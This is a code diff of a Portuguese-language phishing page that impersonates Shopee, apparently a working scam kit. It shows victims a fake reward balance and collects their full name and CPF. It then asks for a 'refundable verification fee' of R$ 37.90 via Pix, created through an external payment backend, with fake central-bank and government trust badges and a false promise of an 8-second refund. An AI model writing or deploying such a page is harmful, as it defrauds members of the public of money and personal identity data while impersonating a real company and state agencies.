@@ -3,362 +3,472 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Resgatar Recompensas | Shopee</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <title>Resgate Shopee</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
     
     <style>
         :root {
-            --shopee-orange: #ee4d2d;
-            --header-black: #161719; /* Preto do topo da imagem de referência */
-            --bg-gray: #f5f5f5;
-            --success-green: #00bfa5;
+            --orange: #ee4d2d;
+            --gray-bg: #f5f5f5;
+            --text-dark: #222;
         }
 
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
 
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: var(--bg-gray);
+            background: #e5e5e5;
             margin: 0;
             display: flex;
             justify-content: center;
             min-height: 100vh;
-            padding-bottom: 90px; /* Espaço para o botão fixo */
+            overflow-x: hidden;
         }
 
-        .container {
+        .app-container {
             width: 100%;
             max-width: 480px;
-            background: var(--bg-gray);
+            background: #fdfdfd;
             min-height: 100vh;
             position: relative;
+            overflow: hidden; /* Importante para o efeito de blur */
+            display: flex;
+            flex-direction: column;
         }
 
-        /* --- HEADER --- */
+        /* --- ETAPA 1: DASHBOARD (Fundo) --- */
         .header {
-            background: white;
-            padding: 12px 15px;
+            padding: 20px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .balance-card {
+            background: var(--orange);
+            margin: 10px 15px;
+            border-radius: 12px;
+            padding: 20px;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
+        }
+        
+        .coin-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 40px;
+            color: rgba(255,255,255,0.2);
+            border: 2px solid rgba(255,255,255,0.4);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
             display: flex;
             align-items: center;
-            border-bottom: 1px solid #eee;
+            justify-content: center;
         }
-        .logo-shopee { height: 32px; }
 
-        /* --- SALDO (TOPO PRETO) --- */
-        .balance-card {
-            background-color: var(--header-black);
-            color: white;
-            padding: 30px 20px;
-            border-bottom-left-radius: 20px;
-            border-bottom-right-radius: 20px;
-            margin-bottom: -40px; /* Efeito de sobreposição */
-            padding-bottom: 60px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
-            position: relative;
-            z-index: 1;
+        .withdraw-section {
+            padding: 20px;
         }
-        .balance-label {
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            opacity: 0.8;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-        .balance-value {
-            font-size: 38px;
+        
+        .section-title {
             font-weight: 700;
-            letter-spacing: -1px;
-            margin-bottom: 5px;
-        }
-        .balance-sub {
-            font-size: 13px;
-            color: #ccc;
+            font-size: 16px;
+            margin-bottom: 15px;
             display: flex;
             align-items: center;
             gap: 5px;
         }
-        .dot { width: 8px; height: 8px; background: #fbce05; border-radius: 50%; display: inline-block; }
 
-        /* --- CARD BRANCO (CONTEÚDO) --- */
-        .card {
-            background: white;
-            margin: 0 15px;
-            border-radius: 12px;
-            padding: 25px 20px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
-            position: relative;
-            z-index: 2;
-        }
-
-        .section-title {
-            font-size: 13px;
-            color: #888;
-            text-transform: uppercase;
-            font-weight: 600;
-            margin-bottom: 15px;
-            letter-spacing: 0.5px;
-        }
-
-        .price-row {
-            display: flex;
-            align-items: center;
-            gap: 12px;
+        .grid-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
             margin-bottom: 15px;
         }
 
-        .price-big {
-            font-size: 34px;
+        .option-card {
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 15px 5px;
+            text-align: center;
             font-weight: 700;
-            color: var(--shopee-orange);
-        }
-
-        .badge-refund {
-            background: rgba(0, 191, 165, 0.12);
-            color: var(--success-green);
-            padding: 5px 10px;
-            border-radius: 6px;
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-        }
-
-        .explainer-text {
             font-size: 14px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 25px;
-            border-bottom: 1px dashed #eee;
-            padding-bottom: 20px;
+            color: #333;
+            border: 1px solid transparent;
         }
 
-        /* --- INPUTS ESTILO "LISTA DE RECIBO" --- */
-        .input-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 14px 0;
-            border-bottom: 1px solid #f1f1f1;
+        .big-option {
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 25px;
+            text-align: center;
+            font-weight: 800;
+            font-size: 24px;
+            color: #333;
+            cursor: pointer;
+            transition: 0.2s;
+            border: 2px solid transparent;
         }
         
-        .input-row label {
-            font-size: 14px;
-            color: #666;
-            font-weight: 500;
+        .big-option:active {
+            transform: scale(0.98);
+            border-color: var(--orange);
+            background: #fff5f1;
         }
 
-        .input-row input {
-            text-align: right;
-            border: none;
-            font-size: 15px;
-            font-weight: 600;
-            color: #333;
-            width: 65%;
-            background: transparent;
-            font-family: 'Roboto', sans-serif;
-        }
-        .input-row input::placeholder { color: #bbb; font-weight: 400; }
-
-        .total-row {
+        .footer-banner {
+            margin: 20px;
+            background: white;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            padding: 20px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            margin-top: 20px;
-            font-size: 16px;
-            font-weight: 700;
-            color: #333;
+            gap: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
 
-        /* --- FOOTER FIXO --- */
-        .footer-fixed {
+        /* --- MÁSCARA DE OFUSCAMENTO (BLUR) --- */
+        .overlay-blur {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4);
+            backdrop-filter: blur(4px);
+            z-index: 90;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+        .overlay-blur.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        /* --- ETAPA 2 & 3: MODAL SLIDE UP --- */
+        .bottom-sheet {
             position: fixed;
             bottom: 0;
-            left: 0;
+            left: 50%;
+            transform: translateX(-50%) translateY(110%); /* Começa escondido */
             width: 100%;
+            max-width: 480px;
             background: white;
-            padding: 15px 20px;
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.05);
+            border-top-left-radius: 20px;
+            border-top-right-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 -5px 25px rgba(0,0,0,0.15);
             z-index: 100;
-            display: flex;
-            justify-content: center;
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        
+        .bottom-sheet.active {
+            transform: translateX(-50%) translateY(0);
         }
 
-        .btn-pay {
-            background-color: var(--shopee-orange);
-            color: white;
+        /* ESTILOS DA ETAPA 2 (INPUTS) */
+        .sheet-header {
+            text-align: center;
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 25px;
+        }
+
+        .input-group { margin-bottom: 20px; }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        .input-group input, .input-group select {
             width: 100%;
-            max-width: 450px;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f9f9f9;
+        }
+        .input-group input:focus {
+            border-color: var(--orange);
+            background: white;
+        }
+
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin: 20px 0;
+            opacity: 0.7;
+        }
+        .trust-img { height: 25px; object-fit: contain; }
+
+        .btn-action {
+            width: 100%;
             padding: 16px;
+            background: var(--orange);
+            color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 700;
             text-transform: uppercase;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.3);
-            transition: 0.2s;
         }
-        .btn-pay:active { transform: scale(0.98); }
-        .btn-pay:disabled { background-color: #ccc; box-shadow: none; cursor: not-allowed; }
 
-        /* --- MODAL QR CODE --- */
-        #qr-overlay {
+        /* ESTILOS DA ETAPA 3 (CONFIRMAÇÃO) */
+        .confirm-box {
+            background: #fff;
+            padding: 0;
+        }
+        
+        .price-highlight {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--orange);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .tag-reembolso {
+            background: #e0f7fa;
+            color: #006064;
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .info-text {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .review-data {
+            border-top: 1px dashed #ddd;
+            border-bottom: 1px dashed #ddd;
+            padding: 15px 0;
+            margin-bottom: 20px;
+        }
+        
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        .data-label { color: #888; }
+        .data-val { font-weight: 600; text-align: right; }
+
+        /* MODAL QR CODE (FINAL) */
+        #qr-screen {
             display: none;
-            position: fixed;
+            position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
+            background: white;
             z-index: 200;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            backdrop-filter: blur(3px);
         }
-        .qr-card {
-            background: white;
-            padding: 30px 20px;
-            border-radius: 16px;
-            text-align: center;
-            width: 100%;
-            max-width: 360px;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-        }
-        .qr-img { width: 200px; margin: 15px auto; display: block; border-radius: 8px; border: 1px solid #eee; }
-        .pix-copia { 
-            background: #f9f9f9; padding: 12px; 
-            font-size: 12px; color: #666; word-break: break-all; border-radius: 6px; margin: 15px 0; border: 1px dashed #ddd;
-        }
-        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 26px; cursor: pointer; color: #999; }
-        
-        .status-success {
-            background: #d4edda; color: #155724; padding: 15px;
-            border-radius: 8px; margin-top: 15px; font-weight: bold; display: none;
-            animation: fadeIn 0.5s;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <img src="https://logodownload.org/wp-content/uploads/2021/03/shopee-logo-0.png" alt="Shopee" class="logo-shopee">
-        </div>
-
-        <div class="balance-card">
-            <div class="balance-label">SALDO DISPONÍVEL</div>
-            <div class="balance-value">R$ 1.489,38</div>
-            <div class="balance-sub">
-                <span class="dot"></span> Aguardando confirmação para saque
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="section-title">CONFIRMAÇÃO DE IDENTIDADE</div>
+    <div class="app-container">
+        
+        <div id="stage-1">
+            <div class="header">Resgatar recompensas</div>
             
-            <div class="price-row">
-                <div class="price-big" id="display-valor">R$ --,--</div>
-                <div class="badge-refund">VALOR REEMBOLSÁVEL</div>
+            <div class="balance-card">
+                <div style="font-size: 14px; margin-bottom: 5px;">Seu saldo</div>
+                <div style="font-size: 32px; font-weight: 800;">R$ 1.489,38</div>
+                <div style="font-size: 12px; opacity: 0.9; margin-top: 5px;">= 42.583,05 pontos (s)</div>
+                <div style="margin-top: 15px; font-size: 11px; border-top: 1px dashed rgba(255,255,255,0.3); padding-top: 10px;">
+                    Última bonificação apresentada: R$ 845,24
+                </div>
+                <div class="coin-icon">$</div>
             </div>
 
-            <p class="explainer-text">
-                Taxa de verificação obrigatória para liberação do saldo de <b>R$ 1.489,38</b>. O valor de <span id="txt-taxa-desc">--,--</span> será estornado automaticamente para sua conta em <strong>8 segundos</strong> após a validação.
+            <div class="withdraw-section">
+                <div class="section-title">Sacar dinheiro</div>
+                <div style="font-size: 13px; color: #888; margin-bottom: 10px;">Transferência via Pix</div>
+
+                <div class="grid-options">
+                    <div class="option-card">R$1,5</div>
+                    <div class="option-card">R$5</div>
+                    <div class="option-card">R$10</div>
+                </div>
+
+                <div class="big-option" onclick="abrirEtapa2()">
+                    R$ 1.489,38
+                </div>
+                <div style="text-align: center; color: #ccc; font-size: 12px; margin-top: 5px;">Toque para sacar tudo</div>
+
+                <p style="font-size: 11px; color: #999; text-align: center; margin-top: 20px; line-height: 1.4;">
+                    Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque podem variar.
+                </p>
+            </div>
+
+            <div class="footer-banner">
+                <div style="flex:1;">
+                    <div style="font-weight: 700; font-size: 14px;">Obtenha seu acesso exclusivo</div>
+                    <div style="font-size: 11px; color: #666; margin-top: 5px;">Descubra todos os benefícios liberados especialmente para você.</div>
+                </div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/2560px-Shopee.svg.png" style="width: 40px;">
+            </div>
+        </div>
+
+        <div class="overlay-blur" id="overlay"></div>
+
+        <div class="bottom-sheet" id="stage-2">
+            <div class="sheet-header">Vincular PIX</div>
+
+            <div class="input-group">
+                <label>Nome Completo</label>
+                <input type="text" id="input-nome" placeholder="Digite seu nome completo">
+            </div>
+
+            <div class="input-group">
+                <label>Tipo de Chave PIX</label>
+                <select id="input-tipo">
+                    <option value="cpf">CPF</option>
+                    <option value="celular">Celular</option>
+                    <option value="email">E-mail</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <label>Chave PIX (CPF)</label>
+                <input type="tel" id="input-chave" placeholder="Digite sua chave aqui" maxlength="14" oninput="formatarCPF(this)">
+            </div>
+
+            <div style="text-align: center; color: #00bfa5; font-size: 12px; margin: 15px 0; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px;">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="#00bfa5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                Reembolso automático em 1 minuto
+            </div>
+
+            <div class="trust-badges">
+                <div style="font-weight:bold; color:#005da3;">BACEN</div>
+                <div style="font-weight:bold; color:#00a000;">gov.br</div>
+                <div style="font-weight:bold; color:#222;">Receita Federal</div>
+            </div>
+
+            <button class="btn-action" onclick="irParaEtapa3()">CONTINUAR</button>
+            <div style="text-align: center; color: #ccc; font-size: 11px; margin-top: 10px;">Processo 100% seguro</div>
+        </div>
+
+        <div class="bottom-sheet" id="stage-3">
+            <div style="font-size: 12px; color: #888; font-weight: 700; margin-bottom: 5px;">CONFIRMAÇÃO DE IDENTIDADE</div>
+            
+            <div class="price-highlight">
+                R$ 37,90 
+                <span class="tag-reembolso">VALOR REEMBOLSÁVEL</span>
+            </div>
+
+            <p class="info-text">
+                Taxa de verificação obrigatória para liberação do saldo de <b>R$ 1.489,38</b>. O valor de R$ 37,90 será estornado automaticamente para sua conta em <b>8 segundos</b> após a validação.
             </p>
 
-            <div style="margin-bottom: 10px;">
-                <div class="section-title" style="margin-bottom: 5px;">DADOS PARA O PIX</div>
-                
-                <div class="input-row">
-                    <label>Nome Completo</label>
-                    <input type="text" id="nome" placeholder="Digite seu nome">
+            <div class="review-data">
+                <div style="font-size: 11px; color: #888; font-weight: 700; margin-bottom: 10px;">DADOS PARA O PIX</div>
+                <div class="data-row">
+                    <span class="data-label">Nome</span>
+                    <span class="data-val" id="review-nome">--</span>
                 </div>
-                
-                <div class="input-row">
-                    <label>CPF</label>
-                    <input type="tel" id="cpf" placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)">
+                <div class="data-row">
+                    <span class="data-label">Chave PIX</span>
+                    <span class="data-val" id="review-chave">--</span>
                 </div>
-
-                <div class="input-row">
-                    <label>Chave Pix</label>
-                    <input type="text" value="CPF do Titular" disabled style="color:#888;">
-                </div>
-
-                <div class="total-row">
-                    <span>Valor a receber</span>
-                    <span style="color:var(--shopee-orange);">R$ 1.489,38</span>
+                <div class="data-row" style="margin-top: 15px; align-items: center;">
+                    <span class="data-label">Valor a receber</span>
+                    <span class="data-val" style="color: var(--orange); font-size: 18px;">R$ 1.489,38</span>
                 </div>
             </div>
-        </div>
-        
-        <div class="footer-fixed">
-            <button class="btn-pay" onclick="gerarPix()" id="btn-pagar">CONFIRMAR E SACAR</button>
-        </div>
-    </div>
 
-    <div id="qr-overlay">
-        <div class="qr-card">
-            <span class="close-btn" onclick="fecharModal()">&times;</span>
-            <h3 style="margin:0 0 5px 0; color:#333;">Pagamento via Pix</h3>
-            <p style="font-size:13px; color:#666; margin:0;">Finalize para receber o reembolso em 8s.</p>
-            
-            <img id="qr-image" class="qr-img" src="" alt="QR Code">
-            
-            <div class="pix-copia" id="pix-code">Gerando código...</div>
-            
-            <button onclick="copiarCodigo()" style="background:white; border:1px solid var(--shopee-orange); color:var(--shopee-orange); padding:10px 20px; border-radius:6px; font-weight:600; cursor:pointer; width:100%;">Copiar Código Pix</button>
-
-            <div class="status-success" id="msg-sucesso">
-                ✅ SAQUE LIBERADO!<br>
-                <span style="font-size:12px; font-weight:normal;">O estorno e o saldo foram enviados.</span>
-            </div>
+            <button class="btn-action" id="btn-final" onclick="gerarPixReal()">PAGAR R$ 37,90 E SACAR</button>
         </div>
+
+        <div id="qr-screen">
+            <h3 style="color:#333;">Pagamento via Pix</h3>
+            <p style="font-size:14px; text-align:center; color:#555;">Pague e receba seu saldo + estorno em 8s.</p>
+            <img id="qr-image" style="width: 220px; margin: 20px 0; border:1px solid #eee;">
+            <div id="pix-copia" style="font-size:11px; color:#777; background:#f0f0f0; padding:10px; border-radius:5px; word-break:break-all; margin-bottom:20px;"></div>
+            <button class="btn-action" onclick="copiarCodigo()">COPIAR CÓDIGO</button>
+            <div id="msg-sucesso" style="margin-top:20px; color:green; font-weight:bold; display:none;">✅ PAGAMENTO CONFIRMADO!</div>
+        </div>
+
     </div>
 
     <script>
         const API_URL = "https://checkout-pix-profissional.onrender.com";
 
-        // --- LÓGICA DE VALORES ---
-        const params = new URLSearchParams(window.location.search);
-        const fase = params.get("fase");
-        
-        let valorAtual = 37.90; // Valor padrão Fase 1
-        if (fase === "2") {
-            valorAtual = 47.90; // Valor padrão Fase 2
+        // --- CONTROLE DAS ETAPAS ---
+
+        function abrirEtapa2() {
+            // Ativa o blur no fundo
+            document.getElementById('overlay').classList.add('active');
+            // Sobe a Etapa 2
+            document.getElementById('stage-2').classList.add('active');
         }
 
-        // Atualiza a tela
-        const valorTexto = "R$ " + valorAtual.toFixed(2).replace(".", ",");
-        document.getElementById("display-valor").innerText = valorTexto;
-        document.getElementById("txt-taxa-desc").innerText = valorTexto;
-        document.getElementById("btn-pagar").innerText = `PAGAR ${valorTexto} E SACAR`;
+        function irParaEtapa3() {
+            const nome = document.getElementById('input-nome').value;
+            const chave = document.getElementById('input-chave').value;
 
-        // --- FUNÇÕES ---
-        function mascaraCPF(i) {
-            let v = i.value.replace(/\D/g, "");
-            if (v.length > 11) v = v.slice(0, 11);
-            i.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-        }
-
-        async function gerarPix() {
-            const nome = document.getElementById('nome').value;
-            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
-            const btn = document.getElementById('btn-pagar');
-
-            if (nome.length < 3 || cpf.length < 11) {
-                alert("Preencha seus dados corretamente para receber o valor.");
+            if(nome.length < 3 || chave.length < 5) {
+                alert("Por favor, preencha seus dados corretamente.");
                 return;
             }
 
-            btn.disabled = true;
+            // Preenche os dados na Etapa 3 (Automaticamente)
+            document.getElementById('review-nome').innerText = nome;
+            document.getElementById('review-chave').innerText = chave;
+
+            // Fecha Etapa 2 e Abre Etapa 3
+            document.getElementById('stage-2').classList.remove('active');
+            
+            // Pequeno delay para transição suave
+            setTimeout(() => {
+                document.getElementById('stage-3').classList.add('active');
+            }, 200);
+        }
+
+        function formatarCPF(i) {
+            let v = i.value.replace(/\D/g,"");
+            v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4");
+            i.value = v;
+        }
+
+        // --- INTEGRAÇÃO COM SEU BACKEND ---
+
+        async function gerarPixReal() {
+            const nome = document.getElementById('input-nome').value;
+            const cpf = document.getElementById('input-chave').value.replace(/\D/g,''); // Limpa CPF
+            const btn = document.getElementById('btn-final');
+
             btn.innerText = "GERANDO...";
+            btn.disabled = true;
 
             try {
+                // Chama a API que já criamos
                 const res = await fetch(`${API_URL}/pix`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        amount: valorAtual,
+                        amount: 37.90, // Valor da taxa
                         name: nome,
                         cpf: cpf
                     })
@@ -369,56 +479,41 @@
                 if (data.point_of_interaction) {
                     const qr = data.point_of_interaction.transaction_data;
                     
-                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
-                    document.getElementById('pix-code').innerText = qr.qr_code;
-                    document.getElementById('qr-overlay').style.display = 'flex'; // Abre Modal
+                    // Mostra tela de QR Code
+                    document.getElementById('stage-3').classList.remove('active');
+                    document.getElementById('overlay').classList.remove('active'); // Remove blur
                     
-                    btn.innerText = "AGUARDANDO PAGAMENTO...";
-                    monitorarPagamento(data.id);
-                } else {
-                    alert("Erro ao gerar. Tente novamente.");
-                    btn.disabled = false;
-                    btn.innerText = "CONFIRMAR E SACAR";
+                    const telaQr = document.getElementById('qr-screen');
+                    telaQr.style.display = 'flex';
+                    
+                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
+                    document.getElementById('pix-copia').innerText = qr.qr_code;
+
+                    monitorar(data.id);
                 }
-            } catch (error) {
-                alert("Erro de conexão.");
+            } catch (e) {
+                alert("Erro ao conectar. Tente novamente.");
+                btn.innerText = "TENTAR NOVAMENTE";
                 btn.disabled = false;
-                btn.innerText = "CONFIRMAR E SACAR";
             }
         }
 
-        function monitorarPagamento(id) {
-            const intervalo = setInterval(async () => {
+        function monitorar(id) {
+            setInterval(async () => {
                 try {
-                    const res = await fetch(`${API_URL}/pix/${id}`);
-                    const json = await res.json();
-
-                    // Aceita Aprovado (Pagou) ou Reembolsado (Já voltou)
-                    if (json.status === 'approved' || json.status === 'refunded') {
-                        clearInterval(intervalo);
+                    const r = await fetch(`${API_URL}/pix/${id}`);
+                    const j = await r.json();
+                    if(j.status === 'approved' || j.status === 'refunded') {
                         document.getElementById('msg-sucesso').style.display = 'block';
                         document.getElementById('qr-image').style.opacity = 0.3;
-                        document.getElementById('btn-pagar').innerText = "SAQUE REALIZADO 🚀";
-                        document.getElementById('btn-pagar').style.background = "#28a745";
-                        
-                        // Opcional: Redirecionar para página de "Obrigado"
-                        // setTimeout(() => window.location.href = "https://seusite.com/obrigado", 3000);
                     }
-                } catch (e) {}
+                } catch(e){}
             }, 3000);
         }
 
-        function copyingCodigo() { // Corrigido nome da função no botão
-             navigator.clipboard.writeText(document.getElementById('pix-code').innerText);
-             alert("Código copiado!");
-        }
-        // Ajuste para o botão usar a função correta
-        window.copiarCodigo = copyingCodigo;
-
-        function fecharModal() {
-            document.getElementById('qr-overlay').style.display = 'none';
-            document.getElementById('btn-pagar').disabled = false;
-            document.getElementById('btn-pagar').innerText = "CONFIRMAR E SACAR";
+        function copiarCodigo() {
+            navigator.clipboard.writeText(document.getElementById('pix-copia').innerText);
+            alert("Código copiado!");
         }
     </script>
 </body>
